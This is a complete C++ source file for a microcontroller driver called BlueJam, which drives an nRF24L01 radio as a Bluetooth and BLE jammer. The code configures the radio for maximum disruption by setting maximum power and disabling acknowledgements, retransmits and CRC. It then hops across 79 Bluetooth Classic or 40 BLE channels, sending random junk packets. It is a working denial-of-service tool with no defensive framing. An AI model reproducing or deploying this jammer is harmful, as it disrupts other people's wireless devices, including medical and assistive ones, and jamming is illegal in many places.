#include "BlueJam.h"

// ─── nRF24L01+ Register Map (only the ones we need) ─────────────────────────
// Full datasheet: https://www.sparkfun.com/datasheets/Components/SMD/nRF24L01Pluss_Preliminary_Product_Specification_v1_0.pdf

#define NRF_CONFIG      0x00  // Configuration register
#define NRF_EN_AA       0x01  // Auto-acknowledgement (disable for jamming)
#define NRF_EN_RXADDR   0x02  // Enabled RX addresses
#define NRF_SETUP_AW    0x03  // Address width
#define NRF_SETUP_RETR  0x04  // Auto-retransmit (disable for jamming)
#define NRF_RF_CH       0x05  // RF channel (0-125 = 2400-2525 MHz)
#define NRF_RF_SETUP    0x06  // RF setup: data rate, power, etc.
#define NRF_STATUS      0x07  // Status register
#define NRF_TX_ADDR     0x10  // TX address
#define NRF_RX_ADDR_P0  0x0A  // RX address pipe 0
#define NRF_FLUSH_TX    0xE1  // Flush TX FIFO
#define NRF_W_TX_PAYLOAD 0xA0 // Write TX payload

#define NRF_WRITE_REG   0x20  // OR with register address to write

// ─── BLE Channel Frequency Map ──────────────────────────────────────────────
// BLE uses 40 channels but they're not sequential.
// Advertising channels: 37 (2402), 38 (2426), 39 (2480)
// Data channels: 0-36 mapped to specific frequencies.
// These are the nRF24 channel numbers (freq = 2400 + channel MHz).

const uint8_t BlueJam::_bleChannels[BLE_NUM_CHANNELS] = {
    // Data channels 0-36
     4,  6,  8, 10, 12, 14, 16, 18, 20, 22, 24,
    28, 30, 32, 34, 36, 38, 40, 42, 44, 46, 48,
    50, 52, 54, 56, 58, 60, 62, 64, 66, 68, 70,
    72, 74, 76, 78,
    // Advertising channels 37, 38, 39
     2, 26, 80
};

// ─── Constructor ─────────────────────────────────────────────────────────────

BlueJam::BlueJam()
    : _hspi(HSPI), _hardwarePresent(false), _running(false),
      _mode(JAM_OFF), _currentChannel(BT_CHANNEL_START), _packetsSent(0) {}

// ─── Initialise the nRF24L01 ────────────────────────────────────────────────
// Sets up HSPI and configures the radio for maximum disruption:
//   - 2 Mbps data rate (fastest, covers more bandwidth per channel)
//   - Maximum TX power (0 dBm on basic module, +20 dBm on PA+LNA version)
//   - No auto-acknowledgement (we don't care about responses)
//   - No retransmits (just blast packets)
//   - 32-byte payload of random data

bool BlueJam::begin() {
    // Init HSPI on our custom pins (separate from TFT's VSPI)
    _hspi.begin(NRF_SCK, NRF_MISO, NRF_MOSI, NRF_CSN);

    pinMode(NRF_CE, OUTPUT);
    pinMode(NRF_CSN, OUTPUT);
    digitalWrite(NRF_CE, LOW);
    digitalWrite(NRF_CSN, HIGH);

    delay(5);  // nRF24 needs 1.5ms after power-on

    // Check if hardware is present by reading status register
    uint8_t status = readRegister(NRF_STATUS);
    _hardwarePresent = (status != 0x00 && status != 0xFF);

    if (!_hardwarePresent) {
        Serial.println(F("BlueJam: nRF24L01 NOT FOUND!"));
        Serial.println(F("  Check wiring: CE=25, CSN=26, MOSI=13, MISO=12, SCK=14"));
        return false;
    }

    Serial.print(F("BlueJam: nRF24L01 found (status=0x"));
    Serial.print(status, HEX);
    Serial.println(F(")"));

    // ── Configure for jamming ──

    // Disable auto-acknowledgement on all pipes
    writeRegister(NRF_EN_AA, 0x00);

    // Disable auto-retransmit
    writeRegister(NRF_SETUP_RETR, 0x00);

    // Set address width to 3 bytes (minimum)
    writeRegister(NRF_SETUP_AW, 0x01);

    // RF setup: 2 Mbps, maximum power (0 dBm / +20 dBm with PA)
    // Bits [3]: 1 = 2 Mbps, Bits [2:1]: 11 = 0 dBm
    writeRegister(NRF_RF_SETUP, 0x0E);

    // Set a dummy TX address (doesn't matter for jamming)
    uint8_t txAddr[3] = { 0xAA, 0xBB, 0xCC };
    digitalWrite(NRF_CSN, LOW);
    _hspi.transfer(NRF_WRITE_REG | NRF_TX_ADDR);
    for (int i = 0; i < 3; i++) _hspi.transfer(txAddr[i]);
    digitalWrite(NRF_CSN, HIGH);

    // Set RX address pipe 0 to same (for auto-ack, which we disabled anyway)
    digitalWrite(NRF_CSN, LOW);
    _hspi.transfer(NRF_WRITE_REG | NRF_RX_ADDR_P0);
    for (int i = 0; i < 3; i++) _hspi.transfer(txAddr[i]);
    digitalWrite(NRF_CSN, HIGH);

    // Power up in TX mode
    // CONFIG: PWR_UP=1, PRIM_RX=0, EN_CRC=0 (no CRC for speed)
    writeRegister(NRF_CONFIG, 0x02);
    delay(2);  // 1.5ms power-up delay

    Serial.println(F("BlueJam: nRF24L01 configured for jamming."));
    return true;
}

bool BlueJam::isHardwarePresent() { return _hardwarePresent; }

// ─── Start/Stop ─────────────────────────────────────────────────────────────

void BlueJam::start(JamMode mode) {
    if (!_hardwarePresent) {
        Serial.println(F("BlueJam: Cannot start — no nRF24L01 hardware!"));
        return;
    }

    _mode = mode;
    _running = true;
    _packetsSent = 0;
    _currentChannel = BT_CHANNEL_START;

    powerUp();

    Serial.print(F("BlueJam: Started "));
    Serial.println(mode == JAM_BLE ? F("BLE jamming (40 ch)") : F("Bluetooth jamming (79 ch)"));
}

void BlueJam::stop() {
    _running = false;
    _mode = JAM_OFF;
    digitalWrite(NRF_CE, LOW);
    powerDown();

    Serial.print(F("BlueJam: Stopped. Packets sent: "));
    Serial.println(_packetsSent);
}

bool BlueJam::isRunning() { return _running; }
JamMode BlueJam::getMode() { return _mode; }

// ─── Main loop — hop channels and transmit ──────────────────────────────────
// This should be called as fast as possible from loop().
// Each call: set channel → transmit junk → advance to next channel.
// Bluetooth hops 1600 times/sec, so we need to be fast too.

void BlueJam::update() {
    if (!_running || !_hardwarePresent) return;

    // Set the nRF24 to the current channel
    setChannel(_currentChannel);

    // Blast a junk packet
    transmitJunk();
    _packetsSent++;

    // Advance to next channel
    if (_mode == JAM_BLUETOOTH) {
        // Bluetooth Classic: sweep channels 2-80 (79 channels)
        _currentChannel++;
        if (_currentChannel > BT_CHANNEL_END) {
            _currentChannel = BT_CHANNEL_START;
        }
    } else if (_mode == JAM_BLE) {
        // BLE: use the specific BLE channel mapping
        static uint8_t bleIdx = 0;
        bleIdx = (bleIdx + 1) % BLE_NUM_CHANNELS;
        _currentChannel = _bleChannels[bleIdx];
    }
}

unsigned long BlueJam::getPacketsSent() { return _packetsSent; }
uint8_t BlueJam::getCurrentChannel() { return _currentChannel; }

// ─── nRF24L01 Low-Level Register Access ─────────────────────────────────────

void BlueJam::writeRegister(uint8_t reg, uint8_t value) {
    digitalWrite(NRF_CSN, LOW);
    _hspi.transfer(NRF_WRITE_REG | reg);
    _hspi.transfer(value);
    digitalWrite(NRF_CSN, HIGH);
}

uint8_t BlueJam::readRegister(uint8_t reg) {
    digitalWrite(NRF_CSN, LOW);
    _hspi.transfer(reg & 0x1F);  // Read command
    uint8_t value = _hspi.transfer(0xFF);
    digitalWrite(NRF_CSN, HIGH);
    return value;
}

void BlueJam::setChannel(uint8_t channel) {
    writeRegister(NRF_RF_CH, channel);
}

// ─── Transmit a junk packet ─────────────────────────────────────────────────
// Fills the TX FIFO with 32 bytes of random data and triggers transmission.
// The nRF24 sends this as fast as possible at 2 Mbps.

void BlueJam::transmitJunk() {
    // Flush any old TX data
    digitalWrite(NRF_CSN, LOW);
    _hspi.transfer(NRF_FLUSH_TX);
    digitalWrite(NRF_CSN, HIGH);

    // Write 32 bytes of junk to TX FIFO
    digitalWrite(NRF_CSN, LOW);
    _hspi.transfer(NRF_W_TX_PAYLOAD);
    for (int i = 0; i < 32; i++) {
        _hspi.transfer(random(256));  // Random data
    }
    digitalWrite(NRF_CSN, HIGH);

    // Pulse CE HIGH to trigger transmission (minimum 10µs)
    digitalWrite(NRF_CE, HIGH);
    delayMicroseconds(15);
    digitalWrite(NRF_CE, LOW);

    // Clear TX status flags
    writeRegister(NRF_STATUS, 0x70);
}

void BlueJam::powerUp() {
    uint8_t config = readRegister(NRF_CONFIG);
    writeRegister(NRF_CONFIG, config | 0x02);  // Set PWR_UP bit
    delay(2);
}

void BlueJam::powerDown() {
    uint8_t config = readRegister(NRF_CONFIG);
    writeRegister(NRF_CONFIG, config & ~0x02);  // Clear PWR_UP bit
}
